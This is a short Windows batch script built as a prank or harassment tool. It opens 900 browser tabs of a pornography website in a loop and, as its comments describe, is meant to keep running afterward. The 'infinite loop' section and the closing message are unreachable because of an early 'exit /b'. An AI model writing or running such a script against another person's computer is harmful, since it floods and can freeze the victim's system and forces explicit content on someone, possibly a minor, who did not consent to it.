@echo off
setlocal enabledelayedexpansion

:: Define the number of tabs to open
set "numTabs=900"

:: Define the URL to open
set "url=http://pornhub.com"

:: Function to open tabs
:open_tabs
set "counter=0"
:loop
if !counter! lss %numTabs% (
    start "" "%url%"
    set /a counter+=1
    goto loop
)
exit /b

:: Main script execution
call :open_tabs

:: Infinite loop to prevent the program from closing
:infinite_loop
ping 127.0.0.1 -n 2 >nul
goto infinite_loop

echo %numTabs% tabs of %url% opened.
pause
